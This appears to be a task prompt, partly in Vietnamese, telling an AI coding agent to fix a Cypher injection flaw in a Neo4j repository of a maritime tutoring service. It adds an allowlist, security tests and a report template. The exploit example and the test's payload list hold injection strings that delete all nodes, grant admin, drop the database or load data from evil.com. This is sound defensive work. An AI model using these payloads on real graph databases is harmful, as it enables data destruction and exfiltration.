# 🚨 CRITICAL SECURITY FIX - Cypher Injection

**Copy toàn bộ prompt này vào Claude Code session mới và thực thi NGAY**

---

## Context

Bạn là **DEVELOPER** agent. REVIEWER đã phát hiện **CRITICAL SECURITY VULNERABILITY** (CVSS 8.1).

**Project:** Maritime AI Tutor Service
**Location:** `/mnt/e/Sach/Sua/AI_v1/maritime-ai-service/`

---

## 🚨 VULNERABILITY DETAILS

**Type:** Cypher Injection
**Severity:** CRITICAL (CVSS 8.1)
**File:** `app/repositories/neo4j_knowledge_repository.py:903-951`

**Problem:** `relation_type` từ LLM output được dùng trực tiếp trong f-string:
```python
cypher = f"""MERGE (s)-[r:{relation_type}]->(t)"""  # VULNERABLE!
```

**Exploit Example:**
```
relation_type = "EVIL}]->(x) DETACH DELETE x MERGE (s)-[r:PWNED"
```
→ Xóa toàn bộ nodes trong database!

---

## FIX REQUIRED

### Step 1: Read the vulnerable file

```
Read file: /mnt/e/Sach/Sua/AI_v1/maritime-ai-service/app/repositories/neo4j_knowledge_repository.py
```

Tìm method `create_entity_relation` (khoảng line 900-950).

### Step 2: Add allowlist validation

**Thêm constant ở đầu class hoặc module:**
```python
# Security: Allowed relation types for Neo4j
ALLOWED_RELATION_TYPES: frozenset[str] = frozenset({
    "REFERENCES",
    "APPLIES_TO",
    "REQUIRES",
    "DEFINES",
    "PART_OF",
    "MENTIONS",
    "CONTAINS",
    "EXAMPLE_OF",
    "CONTRADICTS",
    "SUPPORTS",
    "PREREQUISITE",
    "FOLLOWS",
    "RELATED_TO",
})
```

### Step 3: Add validation in create_entity_relation

**Thêm validation ở đầu method:**
```python
async def create_entity_relation(
    self,
    source_id: str,
    target_id: str,
    relation_type: str,
    confidence: float = 1.0
) -> Optional[Dict[str, Any]]:
    """Create a relation between two entities with validated relation type."""

    # SECURITY: Validate relation_type against allowlist
    if relation_type not in ALLOWED_RELATION_TYPES:
        logger.warning(
            f"[SECURITY] Rejected invalid relation type: {relation_type}"
        )
        raise ValueError(
            f"Invalid relation type: {relation_type}. "
            f"Must be one of: {sorted(ALLOWED_RELATION_TYPES)}"
        )

    # Now safe to use in Cypher query
    # ... rest of existing code
```

### Step 4: Also check kg_builder_agent.py

```
Read file: /mnt/e/Sach/Sua/AI_v1/maritime-ai-service/app/engine/multi_agent/agents/kg_builder_agent.py
```

Nếu có định nghĩa relation types trong prompt, đảm bảo nó match với `ALLOWED_RELATION_TYPES`.

---

## VERIFICATION

Sau khi fix, verify:

```bash
# Search for any remaining f-string Cypher with user input
grep -n "f\".*{.*}.*\"" app/repositories/neo4j*.py | grep -i "merge\|match"
```

Đảm bảo tất cả f-string Cypher queries đều có validation.

---

## TEST CREATION

Tạo file test: `tests/unit/test_neo4j_security.py`

```python
"""Security tests for Neo4j repository - Cypher injection prevention."""
import pytest
from app.repositories.neo4j_knowledge_repository import (
    Neo4jKnowledgeRepository,
    ALLOWED_RELATION_TYPES
)


class TestCypherInjectionPrevention:
    """Test suite for Cypher injection prevention."""

    def test_allowed_relation_types_defined(self):
        """Verify allowlist is properly defined."""
        assert isinstance(ALLOWED_RELATION_TYPES, frozenset)
        assert len(ALLOWED_RELATION_TYPES) >= 10
        assert "REFERENCES" in ALLOWED_RELATION_TYPES
        assert "PART_OF" in ALLOWED_RELATION_TYPES

    @pytest.mark.parametrize("malicious_type", [
        "EVIL}]->(x) DETACH DELETE x MERGE (s)-[r:PWNED",
        "TEST}] SET s.admin=true MERGE (a)-[r:HACKED",
        "FOO}]->(b) MATCH (n) DETACH DELETE n //",
        "BAR\"}]->(c) RETURN 'injected' //",
        "'; DROP DATABASE neo4j; //",
        "REFERENCES}]->(x) CALL db.labels() //",
        "A}]->(b) LOAD CSV FROM 'http://evil.com/data' AS row //",
        "B}]->(c) CALL apoc.cypher.run('MATCH (n) DETACH DELETE n', {}) //",
        "",  # Empty string
        " ",  # Whitespace
    ])
    def test_rejects_malicious_relation_types(self, malicious_type):
        """Verify malicious relation types are rejected."""
        repo = Neo4jKnowledgeRepository()

        with pytest.raises(ValueError, match="Invalid relation type"):
            # Note: This is sync test - adjust if method is async
            repo._validate_relation_type(malicious_type)

    @pytest.mark.parametrize("valid_type", [
        "REFERENCES",
        "PART_OF",
        "MENTIONS",
        "DEFINES",
        "CONTAINS",
    ])
    def test_accepts_valid_relation_types(self, valid_type):
        """Verify valid relation types are accepted."""
        repo = Neo4jKnowledgeRepository()
        # Should not raise
        repo._validate_relation_type(valid_type)

    def test_validation_is_case_sensitive(self):
        """Verify validation is case-sensitive."""
        repo = Neo4jKnowledgeRepository()

        # Lowercase should fail (if allowlist is uppercase)
        with pytest.raises(ValueError):
            repo._validate_relation_type("references")

        # Uppercase should pass
        repo._validate_relation_type("REFERENCES")
```

---

## COMPLETION CHECKLIST

- [ ] Read neo4j_knowledge_repository.py
- [ ] Add `ALLOWED_RELATION_TYPES` frozenset
- [ ] Add validation in `create_entity_relation()`
- [ ] Add logging for rejected types
- [ ] Check kg_builder_agent.py for consistency
- [ ] Create security tests
- [ ] Run tests to verify

---

## COMPLETION REPORT

Khi hoàn thành, báo cáo:

```
🔒 SECURITY FIX COMPLETION REPORT

Vulnerability: Cypher Injection (CVSS 8.1)
Status: FIXED ✅

Changes:
- neo4j_knowledge_repository.py: Added ALLOWED_RELATION_TYPES allowlist
- neo4j_knowledge_repository.py: Added validation in create_entity_relation()
- tests/unit/test_neo4j_security.py: Created with 10+ injection tests

Verification:
- [ ] All malicious payloads rejected
- [ ] Valid relation types accepted
- [ ] Existing tests pass
- [ ] Security tests pass

Impact:
- Cypher injection attack vector closed
- Invalid relation types logged for monitoring
```

---

## START NOW

Bắt đầu với:
```
Read file: /mnt/e/Sach/Sua/AI_v1/maritime-ai-service/app/repositories/neo4j_knowledge_repository.py
```

Tìm `create_entity_relation` method và implement fix.
